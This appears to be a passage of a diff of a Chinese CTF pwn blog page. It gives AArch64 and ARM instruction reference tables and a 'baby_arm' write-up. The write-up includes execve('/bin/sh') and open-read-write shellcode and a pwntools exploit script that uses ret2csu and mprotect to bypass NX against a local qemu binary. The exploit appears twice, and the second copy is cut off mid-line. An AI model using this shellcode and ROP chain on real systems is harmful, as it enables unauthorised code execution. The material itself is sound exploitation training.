-<td>Z&#x3D;0 and N&#x3D;V</td>
-<td><code>BGT label</code></td>
-</tr>
-<tr>
-<td><code>B.GE</code>&#x2F;<code>BGE</code></td>
-<td>大于等于</td>
-<td>N&#x3D;V</td>
-<td><code>BGE label</code></td>
-</tr>
-</tbody></table>
-<h4 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h4><table>
-<thead>
-<tr>
-<th>指令</th>
-<th>含义</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>NOP</code></td>
-<td>空操作</td>
-<td><code>NOP</code></td>
-</tr>
-<tr>
-<td><code>BRK</code></td>
-<td>触发断点</td>
-<td><code>BRK #0</code></td>
-</tr>
-<tr>
-<td><code>SVC</code></td>
-<td>触发系统调用</td>
-<td><code>SVC #0</code></td>
-</tr>
-<tr>
-<td><code>HINT</code></td>
-<td>优化提示（用于处理器）</td>
-<td>-</td>
-</tr>
-</tbody></table>
-<p><code>adr</code>可以将label标签的地址加载到寄存器中,比如<code>adr x0,binsh</code></p>
-<p>此时在汇编处的<code>ascii</code>前加上<code>binsh</code>标签,就可以直接将&#x2F;bin&#x2F;sh的地址赋值给<code>x0</code></p>
+<h3 id="AARCH64"><a href="#AARCH64" class="headerlink" title="AARCH64"></a>AARCH64</h3><h4 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h4><p>指令<br>含义<br>示例<br>说明</p>
+<p><code>MOV</code><br>移动数据<br><code>MOV X0, X1</code><br>把<code>X1</code>的值赋给<code>X0</code>,<code>X1</code>还可以是<code>16</code>位<code>立即数</code></p>
+<p><code>ADD</code><br>加法<br><code>ADD X0, X1, X2</code><br><code>X0 = X1 + X2</code></p>
+<p><code>SUB</code><br>减法<br><code>SUB X0, X1, X2</code><br><code>X0 = X1 - X2</code></p>
+<p><code>MUL</code><br>乘法<br><code>MUL X0, X1, X2</code><br><code>X0 = X1 * X2</code></p>
+<p><code>AND</code><br>按位与<br><code>AND X0, X1, X2</code><br>位运算</p>
+<p><code>ORR</code><br>按位或<br><code>ORR X0, X1, X2</code><br>位运算</p>
+<p><code>EOR</code><br>异或<br><code>EOR X0, X1, X2</code><br>位运算</p>
+<p><code>LSL</code><br>左移<br><code>LSL X0, X1, #3</code><br>&#96;X0 &#x3D; X1 </p>
+<p><code>LSR</code><br>右移<br><code>LSR X0, X1, #2</code><br><code>X0 = X1 &gt;&gt; 2</code></p>
+<p><code>CMP</code><br>比较<br><code>CMP X0, X1</code><br>实际是<code>SUB</code>，不存结果，仅影响标志位</p>
+<h4 id="数据加载与存储"><a href="#数据加载与存储" class="headerlink" title="数据加载与存储"></a>数据加载与存储</h4><p>指令<br>含义<br>示例<br>说明</p>
+<p><code>LDR</code><br>加载<br><code>LDR X0, [X1]</code><br>从<code>X1</code>指向的地址读取值存入<code>X0</code></p>
+<p><code>STR</code><br>存储<br><code>STR X0, [X1]</code><br>把<code>X0</code>的值写入<code>X1</code>指向的地址</p>
+<p><code>LDP</code><br>成对加载<br><code>LDP X0, X1, [SP]</code><br>加载两个值</p>
+<p><code>STP</code><br>成对存储<br><code>STP X0, X1, [SP, #-16]!</code><br>一次存两个，常用于保存栈帧</p>
+<h4 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h4><p>指令<br>含义<br>示例<br>说明</p>
+<p><code>B</code><br>无条件跳转<br><code>B label</code><br>跳转到 label</p>
+<p><code>BL</code><br>跳转并链接<br><code>BL func</code><br>调用函数（保存返回地址到<code>X30</code>）</p>
+<p><code>BR</code><br>跳转寄存器<br><code>BR X30</code><br>类似<code>RET</code></p>
+<p><code>RET</code><br>返回,跳转到<code>X30</code><br><code>RET</code><br>相当于<code>BR X30</code></p>
+<h4 id="条件跳转"><a href="#条件跳转" class="headerlink" title="条件跳转"></a>条件跳转</h4><p>配合CMP使用</p>
+<p>指令<br>含义<br>条件<br>示例</p>
+<p><code>B.EQ</code>&#x2F;<code>BEQ</code><br>相等<br>Z&#x3D;1<br><code>BEQ label</code></p>
+<p><code>B.NE</code>&#x2F;<code>BNE</code><br>不相等<br>Z&#x3D;0<br><code>BNE label</code></p>
+<p><code>B.LT</code>&#x2F;<code>BLT</code><br>小于<br>N≠V<br><code>BLT label</code></p>
+<p><code>B.LE</code>&#x2F;<code>BLE</code><br>小于等于<br>Z&#x3D;1 or N≠V<br><code>BLE label</code></p>
+<p><code>B.GT</code>&#x2F;<code>BGT</code><br>大于<br>Z&#x3D;0 and N&#x3D;V<br><code>BGT label</code></p>
+<p><code>B.GE</code>&#x2F;<code>BGE</code><br>大于等于<br>N&#x3D;V<br><code>BGE label</code></p>
+<h4 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h4><p>指令<br>含义<br>示例</p>
+<p><code>NOP</code><br>空操作<br><code>NOP</code></p>
+<p><code>BRK</code><br>触发断点<br><code>BRK #0</code></p>
+<p><code>SVC</code><br>触发系统调用<br><code>SVC #0</code></p>
+<h2 id="HINT优化提示（用于处理器）"><a href="#HINT优化提示（用于处理器）" class="headerlink" title="HINT优化提示（用于处理器）"></a><code>HINT</code><br>优化提示（用于处理器）</h2><p>adr可以将label标签的地址加载到寄存器中,比如adr x0,binsh</p>
+<p>此时在汇编处的ascii前加上binsh标签,就可以直接将&#x2F;bin&#x2F;sh的地址赋值给x0</p>
 <p>这样可以完成在shellcode内部的字符串地址转化</p>
-<p>其中<code>LDP</code>的扩展使用</p>
+<p>其中LDP的扩展使用</p>
 <ul>
-<li><code>LDP             X19, X20, [SP,#0x10]</code>从<code>SP+0x10</code>开始弹出两个8字节数据给<code>X19</code>和<code>X20</code></li>
-<li><code>LDP             X29, X30, [SP+var_s0],#0x40</code>从<code>SP+var_s0</code>弹出数据后,将<code>SP</code>自增<code>0x40</code></li>
+<li><p>LDP             X19, X20, [SP,#0x10]从SP+0x10开始弹出两个8字节数据给X19和X20</p>
+</li>
+<li><p>LDP             X29, X30, [SP+var_s0],#0x40从SP+var_s0弹出数据后,将SP自增0x40</p>
+</li>
 </ul>
-<p><code>STP</code>的扩展使用</p>
+<p>STP的扩展使用</p>
 <ul>
-<li><code>STP             X29, X30, [SP,#var_s0]!</code>将<code>X29</code>和<code>X30</code>存放在<code>SP+var_s0</code>后将<code>SP+var_s0</code>回写给<code>SP</code>(!的作用)相当于先进行偏移,后进行存储操作</li>
-<li><code>STP             X29, X30, [SP, #-0x50]</code>则只是将<code>X29</code>和<code>X30</code>存放在<code>SP+var_s0</code>,不会改变<code>SP</code></li>
+<li><p>STP             X29, X30, [SP,#var_s0]!将X29和X30存放在SP+var_s0后将SP+var_s0回写给SP(!的作用)相当于先进行偏移,后进行存储操作</p>
+</li>
+<li><p>STP             X29, X30, [SP, #-0x50]则只是将X29和X30存放在SP+var_s0,不会改变SP</p>
+</li>
 </ul>
-<h3 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h3><h4 id="运算-1"><a href="#运算-1" class="headerlink" title="运算"></a>运算</h4><table>
-<thead>
-<tr>
-<th>指令</th>
-<th>含义</th>
-<th>示例</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>MOV</code></td>
-<td>数据传送</td>
-<td><code>mov r0, #1</code></td>
-<td>将立即数1放入r0</td>
-</tr>
-<tr>
-<td><code>MVN</code></td>
-<td>取反</td>
-<td><code>mvn r0, #0</code></td>
-<td>r0 &#x3D;~0</td>
-</tr>
-<tr>
-<td><code>ADD</code></td>
-<td>加法</td>
-<td><code>add r1, r0, #2</code></td>
-<td>r1 &#x3D; r0 + 2</td>
-</tr>
-<tr>
-<td><code>SUB</code></td>
-<td>减法</td>
-<td><code>sub r2, r1, r0</code></td>
-<td>r2 &#x3D; r1 - r0</td>
-</tr>
-<tr>
-<td><code>RSB</code></td>
-<td>反向减法</td>
-<td><code>rsb r3, r0, #5</code></td>
-<td>r3 &#x3D; 5 - r0</td>
-</tr>
-<tr>
-<td><code>AND</code></td>
-<td>按位与</td>
-<td><code>and r4, r0, r1</code></td>
-<td>r4 &#x3D; r0 &amp; r1</td>
-</tr>
-<tr>
-<td><code>ORR</code></td>
-<td>按位或</td>
-<td><code>orr r5, r0, r1</code></td>
-<td>r5 &#x3D; r0</td>
-</tr>
-<tr>
-<td><code>EOR</code></td>
-<td>异或</td>
-<td><code>eor r6, r0, r1</code></td>
-<td>r6 &#x3D; r0 ^ r1</td>
-</tr>
-<tr>
-<td><code>CMP</code></td>
-<td>比较</td>
-<td><code>cmp r0, #1</code></td>
-<td>设置标志位</td>
-</tr>
-<tr>
-<td><code>TST</code></td>
-<td>测试</td>
-<td><code>tst r0, r1</code></td>
-<td>按位与，不改变寄存器，只设置标志位</td>
-</tr>
-</tbody></table>
-<h4 id="数据加载与储存"><a href="#数据加载与储存" class="headerlink" title="数据加载与储存"></a>数据加载与储存</h4><table>
-<thead>
-<tr>
-<th>指令</th>
-<th>含义</th>
-<th>示例</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>LDR</code></td>
-<td>加载字</td>
-<td><code>ldr r0, [r1]</code></td>
-<td>从内存中加载值到 r0</td>
-</tr>
-<tr>
-<td><code>STR</code></td>
-<td>存储字</td>
-<td><code>str r0, [r1]</code></td>
-<td>将 r0 存入内存</td>
-</tr>
-<tr>
-<td><code>LDRB</code></td>
-<td>加载字节</td>
-<td><code>ldrb r0, [r1]</code></td>
-<td>只加载 1 字节</td>
-</tr>
-<tr>
-<td><code>STRB</code></td>
-<td>存储字节</td>
-<td><code>strb r0, [r1]</code></td>
-<td>存入 1 字节</td>
-</tr>
-<tr>
-<td><code>LDMFD</code></td>
-<td>加载多寄存器</td>
-<td><code>ldmfd sp!, &#123;r0-r3&#125;</code></td>
-<td>从栈中加载多个寄存器</td>
-</tr>
-<tr>
-<td><code>STMFD</code></td>
-<td>存储多寄存器</td>
-<td><code>stmfd sp!, &#123;r0-r3&#125;</code></td>
-<td>将多个寄存器入栈</td>
-</tr>
-</tbody></table>
-<h4 id="指令流控制"><a href="#指令流控制" class="headerlink" title="指令流控制"></a>指令流控制</h4><table>
-<thead>
-<tr>
-<th>指令</th>
-<th>含义</th>
-<th>示例</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>B</code></td>
-<td>跳转</td>
-<td><code>b loop</code></td>
-<td>跳转到 loop</td>
-</tr>
-<tr>
-<td><code>BL</code></td>
-<td>跳转并保存</td>
-<td><code>bl func</code></td>
-<td>调用函数，返回地址存在 LR</td>
-</tr>
-<tr>
-<td><code>BX</code></td>
-<td>跳转寄存器</td>
-<td><code>bx lr</code></td>
-<td>跳转到 LR</td>
-</tr>
-<tr>
-<td><code>BLX</code></td>
-<td>跳转切换模式</td>
-<td><code>blx r3</code></td>
-<td>跳转并切换 Thumb&#x2F;ARM 模式</td>
-</tr>
-</tbody></table>
-<h4 id="栈操作"><a href="#栈操作" class="headerlink" title="栈操作"></a>栈操作</h4><table>
-<thead>
-<tr>
-<th>指令</th>
-<th>含义</th>
-<th>示例</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>PUSH</code></td>
-<td>入栈</td>
-<td><code>push &#123;r4, r5, lr&#125;</code></td>
-<td>保存寄存器</td>
-</tr>
-<tr>
-<td><code>POP</code></td>
-<td>出栈</td>
-<td><code>pop &#123;r4, r5, pc&#125;</code></td>
-<td>恢复寄存器，跳转</td>
-</tr>
-<tr>
-<td><code>STMFD</code></td>
-<td>存储多寄存器（Full Descending）</td>
-<td><code>stmfd sp!, &#123;r0-r3&#125;</code></td>
-<td>等价于 push</td>
-</tr>
-<tr>
-<td><code>LDMFD</code></td>
-<td>加载多寄存器</td>
-<td><code>ldmfd sp!, &#123;r0-r3&#125;</code></td>
-<td>等价于 pop</td>
-</tr>
-</tbody></table>
-<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><table>
-<thead>
-<tr>
-<th>指令</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>ADR</code></td>
-<td>计算<strong>当前 PC 相对地址</strong>，将其写入一个寄存器</td>
-</tr>
-<tr>
-<td><code>ADRP</code></td>
-<td>类似<code>ADR</code>，但对齐到<strong>4KB页（Page）边界</strong>，只获取页地址部分，常用于构建绝对地址</td>
-</tr>
-</tbody></table>
+<h3 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h3><h4 id="运算-1"><a href="#运算-1" class="headerlink" title="运算"></a>运算</h4><p>指令<br>含义<br>示例<br>说明</p>
+<p><code>MOV</code><br>数据传送<br><code>mov r0, #1</code><br>将立即数1放入r0</p>
+<p><code>MVN</code><br>取反<br><code>mvn r0, #0</code><br>r0 &#x3D;~0</p>
+<p><code>ADD</code><br>加法<br><code>add r1, r0, #2</code><br>r1 &#x3D; r0 + 2</p>
+<p><code>SUB</code><br>减法<br><code>sub r2, r1, r0</code><br>r2 &#x3D; r1 - r0</p>
+<p><code>RSB</code><br>反向减法<br><code>rsb r3, r0, #5</code><br>r3 &#x3D; 5 - r0</p>
+<p><code>AND</code><br>按位与<br><code>and r4, r0, r1</code><br>r4 &#x3D; r0 &amp; r1</p>
+<p><code>ORR</code><br>按位或<br><code>orr r5, r0, r1</code><br>r5 &#x3D; r0</p>
+<p><code>EOR</code><br>异或<br><code>eor r6, r0, r1</code><br>r6 &#x3D; r0 ^ r1</p>
+<p><code>CMP</code><br>比较<br><code>cmp r0, #1</code><br>设置标志位</p>
+<p><code>TST</code><br>测试<br><code>tst r0, r1</code><br>按位与，不改变寄存器，只设置标志位</p>
+<h4 id="数据加载与储存"><a href="#数据加载与储存" class="headerlink" title="数据加载与储存"></a>数据加载与储存</h4><p>指令<br>含义<br>示例<br>说明</p>
+<p><code>LDR</code><br>加载字<br><code>ldr r0, [r1]</code><br>从内存中加载值到 r0</p>
+<p><code>STR</code><br>存储字<br><code>str r0, [r1]</code><br>将 r0 存入内存</p>
+<p><code>LDRB</code><br>加载字节<br><code>ldrb r0, [r1]</code><br>只加载 1 字节</p>
+<p><code>STRB</code><br>存储字节<br><code>strb r0, [r1]</code><br>存入 1 字节</p>
+<p><code>LDMFD</code><br>加载多寄存器<br><code>ldmfd sp!, &#123;r0-r3&#125;</code><br>从栈中加载多个寄存器</p>
+<p><code>STMFD</code><br>存储多寄存器<br><code>stmfd sp!, &#123;r0-r3&#125;</code><br>将多个寄存器入栈</p>
+<h4 id="指令流控制"><a href="#指令流控制" class="headerlink" title="指令流控制"></a>指令流控制</h4><p>指令<br>含义<br>示例<br>说明</p>
+<p><code>B</code><br>跳转<br><code>b loop</code><br>跳转到 loop</p>
+<p><code>BL</code><br>跳转并保存<br><code>bl func</code><br>调用函数，返回地址存在 LR</p>
+<p><code>BX</code><br>跳转寄存器<br><code>bx lr</code><br>跳转到 LR</p>
+<p><code>BLX</code><br>跳转切换模式<br><code>blx r3</code><br>跳转并切换 Thumb&#x2F;ARM 模式</p>
+<h4 id="栈操作"><a href="#栈操作" class="headerlink" title="栈操作"></a>栈操作</h4><p>指令<br>含义<br>示例<br>说明</p>
+<p><code>PUSH</code><br>入栈<br><code>push &#123;r4, r5, lr&#125;</code><br>保存寄存器</p>
+<p><code>POP</code><br>出栈<br><code>pop &#123;r4, r5, pc&#125;</code><br>恢复寄存器，跳转</p>
+<p><code>STMFD</code><br>存储多寄存器（Full Descending）<br><code>stmfd sp!, &#123;r0-r3&#125;</code><br>等价于 push</p>
+<p><code>LDMFD</code><br>加载多寄存器<br><code>ldmfd sp!, &#123;r0-r3&#125;</code><br>等价于 pop</p>
+<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>指令<br>说明</p>
+<p><code>ADR</code><br>计算<strong>当前 PC 相对地址</strong>，将其写入一个寄存器</p>
+<p><code>ADRP</code><br>类似<code>ADR</code>，但对齐到<strong>4KB页（Page）边界</strong>，只获取页地址部分，常用于构建绝对地址</p>
 <h2 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h2><h3 id="baby-arm"><a href="#baby-arm" class="headerlink" title="baby_arm"></a>baby_arm</h3><h4 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h4><p><img src="/images/arm/1748514329534.png" alt="1748514329534"></p>
 <p>只开启了NX保护</p>
 <p><img src="/images/arm/1748514280009.png" alt="1748514280009"></p>
@@ -810,62 +468,22 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
 
 <p>当然了,手搓shellcode是每个pwn手必备的技能,通过手写汇编会加强我们对指令集的熟悉和理解</p>
-<p>贴一张<code>aarch64</code>常用系统调用表</p>
-<table>
-<thead>
-<tr>
-<th>编号</th>
-<th>系统调用名称</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>64</td>
-<td>write</td>
-<td>写入文件</td>
-</tr>
-<tr>
-<td>63</td>
-<td>read</td>
-<td>读取文件</td>
-</tr>
-<tr>
-<td>56</td>
-<td>openat</td>
-<td>打开文件</td>
-</tr>
-<tr>
-<td>57</td>
-<td>close</td>
-<td>关闭文件</td>
-</tr>
-<tr>
-<td>93</td>
-<td>exit</td>
-<td>退出进程</td>
-</tr>
-<tr>
-<td>94</td>
-<td>exit_group</td>
-<td>退出线程组</td>
-</tr>
-<tr>
-<td>80</td>
-<td>fstat</td>
-<td>获取文件状态信息</td>
-</tr>
-<tr>
-<td>221</td>
-<td>execve</td>
-<td>执行程序</td>
-</tr>
-</tbody></table>
+<p>贴一张aarch64常用系统调用表</p>
+<p>编号<br>系统调用名称<br>描述</p>
+<p>64<br>write<br>写入文件</p>
+<p>63<br>read<br>读取文件</p>
+<p>56<br>openat<br>打开文件</p>
+<p>57<br>close<br>关闭文件</p>
+<p>93<br>exit<br>退出进程</p>
+<p>94<br>exit_group<br>退出线程组</p>
+<p>80<br>fstat<br>获取文件状态信息</p>
+<p>221<br>execve<br>执行程序</p>
 <h5 id="调用execve"><a href="#调用execve" class="headerlink" title="调用execve"></a>调用execve</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sc = asm(<span class="string">&quot;</span></span><br><span class="line"><span class="string">    add x0, x30, #20</span></span><br><span class="line"><span class="string">    mov x1, xzr</span></span><br><span class="line"><span class="string">    mov x2, xzr</span></span><br><span class="line"><span class="string">    mov x8, #221</span></span><br><span class="line"><span class="string">    svc 0</span></span><br><span class="line"><span class="string">    .ascii &quot;</span>/<span class="built_in">bin</span>/sh\\<span class="number">0</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-<p>我们是通过<code>x30</code>跳转到shellcode上的,所有可以通过<code>0x30+offset</code>寻址<code>/bin/sh</code></p>
-<p><code>xzr</code>寄存器是<code>arm</code>架构下一个值恒为0的寄存器,我们用这个清空寄存器</p>
-<p><code>x8</code>用于设置系统调用号,其中execve的系统调用号是221</p>
-<p><code>svc</code>用于触发系统调用</p>
+<p>我们是通过x30跳转到shellcode上的,所有可以通过0x30+offset寻址&#x2F;bin&#x2F;sh</p>
+<p>xzr寄存器是arm架构下一个值恒为0的寄存器,我们用这个清空寄存器</p>
+<p>x8用于设置系统调用号,其中execve的系统调用号是221</p>
+<p>svc用于触发系统调用</p>
 <p>此时会执行execve(“&#x2F;bin&#x2F;sh”,0,0)</p>
 <h5 id="orw调用"><a href="#orw调用" class="headerlink" title="orw调用"></a>orw调用</h5><p>在aarch64中,open已经被废弃,只剩下了openat</p>
 <p>如果想打开名为flag的文件,应该调用openat(-100,”.&#x2F;flag”,0,0)</p>
@@ -874,129 +492,45 @@
 <h4 id="对抗NX保护"><a href="#对抗NX保护" class="headerlink" title="对抗NX保护"></a>对抗NX保护</h4><p>我们想要调用mprotect,参数设置还是很简单的,和x86中的ret2csu几乎相同</p>
 <p>但是ret2csu中的调用部分:此时的got表中还没有mprotect的真实函数地址😵感谢winmt师傅教学</p>
 <ul>
-<li>我们可以先将mprotect的plt表写在bss上</li>
-<li>然后ret2csu中的call的[地址]写为bss的地址,这样就可以正常调用mportect</li>
+<li><p>我们可以先将mprotect的plt表写在bss上</p>
+</li>
+<li><p>然后ret2csu中的call的[地址]写为bss的地址,这样就可以正常调用mportect</p>
+</li>
 </ul>
 <p>调用后直接跳转到shellcode就成了</p>
-<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process([&quot;qemu-aarch64&quot;, &quot;-g&quot;, &quot;4234&quot;,&quot;./pwn&quot;])</span></span><br><span class="line"><span class="comment">#io = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;./&quot;, &quot;-g&quot;, &quot;3234&quot;, &quot;./pwn&quot;])</span></span><br><span class="line">io = process(<span class="string">&quot;qemu-aarch64 -L ./ ./pwn&quot;</span>, shell = <span class="literal">True</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b *0x4007F0&quot;)</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sc = asm(&quot;</span></span><br><span class="line"><span class="string">    add x0, x30, #20</span></span><br><span class="line"><span class="string">    mov x1, xzr</span></span><br><span class="line"><span class="string">    mov x2, xzr</span></span><br><span class="line"><span class="string">    mov x8, #221</span></span><br><span class="line"><span class="string">    svc 0</span></span><br><span class="line"><span class="string">    .ascii &quot;/bin/sh\\0&quot;</span></span><br><span class="line"><span class="string">&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#sc = asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment">#sc=asm(shellcraft.cat(&quot;./flag&quot;))</span></span><br><span class="line"><span class="comment">#print(disasm(sc))</span></span><br><span class="line">sc = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        mov x0,-100</span></span><br><span class="line"><span class="string">        add x1,x30,#0x1f0</span></span><br><span class="line"><span class="string">        mov x2,xzr</span></span><br><span class="line"><span class="string">        mov x3,xzr</span></span><br><span class="line"><span class="string">        mov x8,#56</span></span><br><span class="line"><span class="string">        svc 0</span></span><br><span class="line"><span class="string">        add x1,sp,#0x100</span></span><br><span class="line"><span class="string">        mov x2,#0x100</span></span><br><span class="line"><span class="string">        mov x8,#63</span></span><br><span class="line"><span class="string">        svc 0</span></span><br><span class="line"><span class="string">        mov x0,#1</span></span><br><span class="line"><span class="string">        mov x8,#64</span></span><br><span class="line"><span class="string">        svc 0</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br><span class="line">io.send(p64(<span class="number">0x400600</span>)+sc.ljust(<span class="number">0x1f0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&quot;./flag\x00\x00&quot;</span>)</span><br><span class="line">csu1=<span class="number">0x4008CC</span></span><br><span class="line">csu2=<span class="number">0x4008AC</span></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(csu1)+p64(<span class="number">0</span>)+p64(csu2)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(<span class="number">0x411068</span>)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(<span class="number">0x10000</span>)+p64(<span class="number">0x411000</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x411070</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process([&quot;qemu-aarch64&quot;, &quot;-g&quot;, &quot;4234&quot;,&quot;./pwn&quot;])</span></span><br><span class="line"><span class="comment">#io = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;./&quot;, &quot;-g&quot;, &quot;3234&quot;, &quot;./pwn&quot;])</span></span><br><span class="line">io = process(<span class="string">&quot;qemu-aarch64 -L ./ ./pwn&quot;</span>, shell = <span class="literal">True</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b *0x4007F0&quot;)</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sc = asm(&quot;</span></span><br><span class="line"><span class="string">    add x0, x30, #20</span></span><br><span class="line"><span class="string">    mov x1, xzr</span></span><br><span class="line"><span class="string">    mov x2, xzr</span></span><br><span class="line"><span class="string">    mov x8, #221</span></span><br><span class="line"><span class="string">    svc 0</span></span><br><span class="line"><span class="string">    .ascii &quot;/bin/sh\\0&quot;</span></span><br><span class="line"><span class="string">&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#sc = asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment">#sc=asm(shellcraft.cat(&quot;./flag&quot;))</span></span><br><span class="line"><span class="comment">#print(disasm(sc))</span></span><br><span class="line">sc = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        mov x0,-100</span></span><br><span class="line"><span class="string">        add x1,x30,#0x1f0</span></span><br><span class="line"><span class="string">        mov x2,xzr</span></span><br><span class="line"><span class="string">        mov x3,xzr</span></span><br><span class="line"><span class="string">        mov x8,#56</span></span><br><span class="line"><span class="string">        svc 0</span></span><br><span class="line"><span class="string">        add x1,sp,#0x100</span></span><br><span class="line"><span class="string">        mov x2,#0x100</span></span><br><span class="line"><span class="string">        mov x8,#63</span></span><br><span class="line"><span class="string">        svc 0</span></span><br><span class="line"><span class="string">        mov x0,#1</span></span><br><span class="line"><span class="string">        mov x8,#64</span></span><br><span class="line"><span class="string">        svc 0</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br><span class="line">io.send(p64(<span class="number">0x400600</span>)+sc.ljust(<span class="number">0x1f0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&quot;./flag\x00\x00&quot;</span>)</span><br><span class="line">csu1=<span class="number">0x4008CC</span></span><br><span class="line">csu2=<span class="number">0x4008AC</span></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(csu1)+p64(<span class="number">0</span>)+p64(csu2)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(<span class="number">0x411068</span>)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(<span class="number">0x10000</span>)+p64(<span class="number">0x411000</span>)</span><br><span class="line">payload+=p64(<span 